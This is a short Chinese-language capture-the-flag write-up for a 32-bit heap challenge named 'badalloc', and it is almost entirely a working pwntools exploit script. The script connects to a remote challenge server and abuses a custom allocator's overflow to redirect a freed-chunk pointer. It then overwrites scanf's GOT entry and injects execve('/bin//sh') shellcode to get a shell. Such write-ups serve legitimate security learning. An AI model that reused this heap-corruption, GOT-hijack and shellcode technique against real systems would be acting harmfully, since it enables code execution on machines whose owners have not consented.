## 分析
自己实现的堆分配，明显的溢出漏洞，无任何保护

## 利用
直接将shellcode写在已知位置并劫持eip:
```py
#!/usr/bin/env python
# coding=utf-8
from pwn import *
#p = process("./badalloc")
p = remote('202.1.8.12',40001)
#context.log_level="DEBUG"
def sla(a,b):
    p.sendlineafter(b,a)

def sa(a,b):
    p.sendafter(b,a)

def add(size):
    sla("1","Please choose an option.")
    sla(str(size),"Please give me a size.")

def dele(id):
    sla("2","Please choose an option.")
    sla(str(id),"Please give me an id.")

def edit(id,size,payload):
    sla("3","Please choose an option.")
    sla(str(id),"Please give me an id.")
    sla(str(size),"Please give me a size.")
    sla(payload,"Please input your data.")

def puts(id):
    sla("4","Please choose an option.")
    sla(str(id),"Please give me an id.")

for i in range(3):
    add(0x30)
for i in range(3):
    dele(2-i)
add(0x30)
payload = 'a'*0x3c+p32(0x48)+p32(0x0804B014)
edit(3,0x50,payload)                                #更改链上指针
add(0x30)
add(0x8048422)                                      #控制GOT.plt
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
payload = 'a'*4+p32(0x0804B028)+shellcode           
edit(5,0x30,payload)                                #复写scanf@got
p.interactive() 
```